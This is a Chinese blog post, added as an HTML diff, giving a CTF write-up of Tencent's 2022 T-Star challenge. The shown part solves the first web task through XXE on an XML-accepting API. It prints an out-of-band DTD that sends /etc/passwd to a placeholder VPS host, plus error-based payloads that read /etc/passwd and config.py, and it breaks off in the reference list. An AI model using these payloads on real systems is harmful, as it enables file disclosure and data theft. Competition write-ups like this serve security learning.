@@ -1,0 +1,1980 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="CTF | 2022 未知之境 腾讯网络安全T-Star高校挑战赛 WriteUp, MiaoTony,blog">
+    <meta name="description" content="前几天AK了个腾讯的T-Star高校挑战赛，题目比较偏向Misc和Web，这里记录一下解题过程。">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159946730-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'UA-159946730-1');
+</script>
+
+
+    <title>CTF | 2022 未知之境 腾讯网络安全T-Star高校挑战赛 WriteUp | MiaoTony&#39;s小窝</title>
+    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/favicon.ico">
+
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/matery.min.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/my.css">
+	
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/jquery/jquery.min.js"></script>
+    <script>
+        //来个特效玩玩喵 20200123
+        var titleTime;
+        var OriginTitile = document.title;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '|ω·) 喵~快回来呀！';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(/≧▽≦)/ Meow！';
+                titleTime = setTimeout(function() {
+        	    document.title = OriginTitile;
+        }, 800);
+    }
+        });
+    </script>
+<meta name="generator" content="Hexo 5.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="MiaoTony's小窝" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">MiaoTony&#39;s小窝</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友链</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">MiaoTony&#39;s小窝</div>
+        <div class="logo-desc">
+            
+            喵~欢迎各位大佬的来访呀！
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友链
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/miaotony" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/miaotony" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/13.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">CTF | 2022 未知之境 腾讯网络安全T-Star高校挑战赛 WriteUp</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        min-width: 240px;
+        padding-left: 15px;
+        padding-bottom: 30px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 30px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+	    max-height: 450px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/WriteUp/">
+                                <span class="chip bg-color">WriteUp</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-04-26
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    6.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    26 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <blockquote>
+<p>本文首发于跳跳糖：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1577/">https://tttang.com/archive/1577/</a></p>
+</blockquote>
+<p><img src="/2022/04/26/CTF_2022T-Star/1920x380px-1649743249123.jpg"></p>
+<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><blockquote>
+<p><strong>Into the Unknown｜腾讯网络安全T-Star高校挑战赛</strong></p>
+<p>主办方：腾讯安全应急响应中心(TSRC)</p>
+<p>比赛时间：04/20 10:00 ~ 04/24 18:00</p>
+<p><strong>招募对象</strong></p>
+<p>全日制在读大学生（包括专科院校、硕博学生，年级、专业、地区不限）</p>
+<p>无论你是安全专业学生，还是解密游戏爱好者，都可以在这里大展身手！</p>
+<p><strong>排名规则</strong></p>
+<ol>
+<li><p>个人报名参赛，在线破解</p>
+</li>
+<li><p>比赛共6题，分值分别为100、100、200、200、300、300，排行榜满分为1200分</p>
+</li>
+<li><p><strong>排名逻辑</strong></p>
+</li>
+</ol>
+<ul>
+<li>总分不同，分数高＞分数低。</li>
+<li>总分相同，时间优先。即，根据所答最后一题时间先后，先答题者排名更高。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/competition/introduction/10042">https://cloud.tencent.com/developer/competition/introduction/10042</a></p>
+</blockquote>
+<p>说起来挺早就看到了这个比赛，后来比赛开始群友又在群里推了一下，不过第一天喵喵从早到晚上了一天课，深夜才来瞄了一下题目。</p>
+<p>总体而言整个题目有点像个剧情，类型偏向 Misc 和 Web，正好就合喵喵胃口了。由于有的题目脑洞有点大，再加上后面还有课以及其他事情，一般是半夜在看题，以至于想不通怎么做挺难受的睡不着，直到22号下午才把所有题目 AK，最后排名第17。</p>
+<p>唉，看了看榜首的 ha1c9on、Yoshino-s 等大师傅都挺熟悉了，他们第一天晚上就 AK 了 Orz，喵喵还是太菜了。</p>
+<p>那下面就来记录一下解题的过程吧，大部分边做边写的，可能包含一些误导性的内容，希望各位师傅不要在意。</p>
+<p><em><del>banner 的海报里居然说“最有趣”，广告法警告（小声bb</del></em></p>
+<h2 id="赛题一-未知之境"><a href="#赛题一-未知之境" class="headerlink" title="赛题一 未知之境"></a>赛题一 未知之境</h2><blockquote>
+<p>Into the Unknown……未知之境……</p>
+<p>你看着屏幕上的文字，陷入了沉思。加密你的文件，还拍下了你的一举一动……不管这个人是谁，他都是蓄谋已久。</p>
+<p>那么，是不是应该拒绝？可人生的另一种可能……带领你走向未知……一股熟悉的躁动在指尖传来，不管这个设下圈套的人是谁，他一定都对你极为了解：他知道你不会轻易放弃，你知道你会接受挑战。</p>
+<p>这是作为一个优秀的黑客，必不可少的品质。</p>
+<p>你点开了这个神秘的网站。</p>
+<p><a target="_blank" rel="noopener" href="http://175.178.148.197:5000/">http://175.178.148.197:5000/</a></p>
+<p>这……似乎需要你完成手机号验证才能登陆。进到这个网站后台，是否有更多消息？</p>
+<p>提示：web题，flag为T-Star{字符串}中的字符串，严禁使用扫描器进行路径/验证码暴力破解，此操作对解题没有帮助并将对恶意扫描IP进行封禁。</p>
+</blockquote>
+<p>登录界面，手机验证码点击发送，返回里的 <code>debug</code> 就带有验证码，输入即可通过登录验证。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421173626154.png"></p>
+<p>进来之后看上去是个直播间，但里面其实都是播放的视频。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421173653201.png"></p>
+<p>后端是 gunicorn，前端是 react + webpack 打包的，没开 source map。</p>
+<p>看了老半天前端杂乱的 js，感觉也没几个 api。</p>
+<pre class="line-numbers language-none"><code class="language-none">/api/info?id=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>遍历了 <code>id</code> 也就三个好像，没啥有意思的发现，也没试出来 sql 注入。</p>
+<p>点赞接口比较可疑。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421173958189.png"></p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> /api/like HTTP/1.1</span>
+<span class="token header-name keyword">Host:</span> 175.178.148.197:5000
+<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+<span class="token header-name keyword">Accept:</span> application/json, text/plain, */*
+<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate
+<span class="token header-name keyword">Content-Type:</span> application/json
+<span class="token header-name keyword">Content-Length:</span> 10
+<span class="token header-name keyword">Origin:</span> http://175.178.148.197:5000
+<span class="token header-name keyword">Connection:</span> keep-alive
+<span class="token header-name keyword">Referer:</span> http://175.178.148.197:5000/
+<span class="token header-name keyword">Cookie:</span> session=eyJsb2dpbiI6dHJ1ZX0.YmEloQ.HoKxH0jZ72zQK_jLKiYUMt8ZIBw
+<span class="token header-name keyword">Pragma:</span> no-cache
+<span class="token header-name keyword">Cache-Control:</span> no-cache
+
+{"id":"1"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>response:</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"status"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"count"</span><span class="token operator">:</span> <span class="token number">891</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>试了下注入，没啥用。</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"status"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"count"</span><span class="token operator">:</span> <span class="token string">"No such streamer."</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>其他的接口也就登录、smscode，感觉也没啥用，唔。于是卡了好久。</p>
+<p><strong>最后发现居然能传 xml。。</strong></p>
+<p>POST data 里随意输入非 JSON 字符串，返回</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"ERROR"</span><span class="token operator">:</span> <span class="token string">"No JSON object could be decoded"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>那试试能不能解析 xml？</strong></p>
+<p>改 <code>Content-Type</code> 为 <code>application/xml</code>，然后构造 XXE payload。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220421182409940.png"></p>
+<p>试了下不能回显，得外带（</p>
+<p>VPS 上起个 server 放个 <code>test.dtd</code></p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % int "&lt;!ENTITY <span class="token entity" title="%">&amp;#37;</span> send SYSTEM 'http://vpsip:port/?p=%file;'&gt;"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>payload：</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">convert</span> <span class="token punctuation">[</span><span class="token internal-subset"> 
+&lt;!ENTITY % remote SYSTEM "http://vpsip/test.dtd"&gt;
+%remote;%int;%send;
+</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然而发现 <strong>外带带不出来</strong>。。整了个 dnslog 看了也没 dns 解析记录。</p>
+<p>那整个<strong>报错输出</strong>吧。。</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span> <span class="token punctuation">[</span><span class="token internal-subset">
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">message</span> <span class="token attr-name">ANY</span><span class="token punctuation">&gt;</span></span>
+	&lt;!ENTITY % x SYSTEM "file:///etc/passwd"&gt;
+	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">y</span> <span class="token attr-name">'</span>
+		<span class="token attr-name">&lt;!ENTITY</span> <span class="token attr-name">&amp;#x25;</span> <span class="token attr-name">z</span> <span class="token attr-name">"&lt;!ENTITY</span> <span class="token attr-name">&amp;#x26;#x25;</span> <span class="token attr-name">error</span> <span class="token attr-name">SYSTEM</span> <span class="token attr-name">&amp;#x27;&amp;#x25;x;&amp;#x27;</span><span class="token punctuation">&gt;</span></span>"&gt;
+		<span class="token entity" title="%">&amp;#x25;</span>z;
+	'&gt;
+	%y;
+</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">&gt;</span></span>233<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422174315551.png"></p>
+<p>可以读文件，那 flag 在哪呢？</p>
+<p>发现读不了 <code>/proc/self/environ</code>，因为 0x00 不能解析。（<code>Char 0x0 out of allowed range</code>）</p>
+<p>那直接用 cwd 读 <code>app.py</code> 吧。</p>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422174439592.png"></p>
+<p>可惜遇到引号被截断了，可是 python 不像 PHP 可以用伪协议进行一些编码，不懂 python 能不能编码一下。。希望有大师傅带带喵喵。</p>
+<p>接下来读一下 <code>config.py</code>。</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> /api/like HTTP/1.1</span>
+<span class="token header-name keyword">Host:</span> 175.178.148.197:5000
+<span class="token header-name keyword">Content-Length:</span> 272
+<span class="token header-name keyword">Accept:</span> application/xml
+<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
+<span class="token header-name keyword">Content-Type:</span> application/xml
+<span class="token header-name keyword">Origin:</span> http://175.178.148.197:5000
+<span class="token header-name keyword">Referer:</span> http://175.178.148.197:5000/
+<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate
+<span class="token header-name keyword">Accept-Language:</span> en-US,en;q=0.9,zh-HK;q=0.8,zh-CN;q=0.7,zh;q=0.6
+<span class="token header-name keyword">Cookie:</span> session=eyJsb2dpbiI6dHJ1ZX0.YmDQVQ.XDtZokQz966yViM6teda1VnD42Y
+<span class="token header-name keyword">Connection:</span> close
+
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE message [
+	&lt;!ELEMENT message ANY&gt;
+	&lt;!ENTITY % x SYSTEM "file:///proc/self/cwd/config.py"&gt;
+	&lt;!ENTITY % y '
+		&lt;!ENTITY &amp;#x25; z "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;&amp;#x25;x;&amp;#x27;&gt;"&gt;
+		&amp;#x25;z;
+	'&gt;
+	%y;
+]&gt;
+&lt;message&gt;233&lt;/message&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2022/04/26/CTF_2022T-Star/image-20220422174227759.png"></p>
+<p>拿到 flag</p>
+<p><code>T-STAR{welcome.good/start!}</code></p>
+<blockquote>
+<p><strong>References &amp; Extended Reading</strong></p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357#toc-20">一篇文章带你深入理解漏洞之 XXE 漏洞 —— JSON content-type XXE</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">XML External Entity (XXE) Processing</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/12900903.html">java的xxe无回显的带外传输</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://j7ur8.github.io/WebBook/VUL/%E6%8A%A5%E9%94%99XXE.html">报错XXE</a></p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?&gt;</span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span> <span class="token punctuation">[</span><span class="token internal-subset">
+	&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+	&lt;!ENTITY % a '
+		&lt;!ENTITY <span class="token entity" title="%">&amp;#x25;</span> b "
+			&lt;!ENTITY <span class="token entity" title="&amp;">&amp;#x26;</span>#x25; error SYSTEM <span class="token entity" title="'">&amp;#x27;</span>file:///nonexistent/<span class="token entity" title="%">&amp;#x25;</span>file;<span class="token entity" title="'">&amp;#x27;</span>
+			&gt;
+		"&gt;
+	'&gt;
+%a;
+%b;
+</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">&gt;</span></span>asfddasfd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>phit0on师傅在其小密圈中的payload:</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" ?&gt;</span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">message</span> <span class="token punctuation">[</span><span class="token internal-subset">
+    &lt;!ENTITY % condition '
+        &lt;!ENTITY <span class="token entity" title="%">&amp;#x25;</span> file SYSTEM "file:///etc/passwd"&gt;
+        &lt;!ENTITY <span class="token entity" title="%">&amp;#x25;</span> eval "&lt;!ENTITY <span class="token entity" title="&amp;">&amp;#x26;</span>#x25; error SYSTEM <span class="token entity" title="'">&amp;#x27;</span>file:///nonexistent/<span class="token entity" title="%">&amp;#x25;</span>file;<span class="token entity" title="'">&amp;#x27;</span>&gt;"&gt;
+        <span class="token entity" title="%">&amp;#x25;</span>eval;
+        <span class="token entity" title="%">&amp;#x25;</span>error;
+'&gt;
+    %condition;
+</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
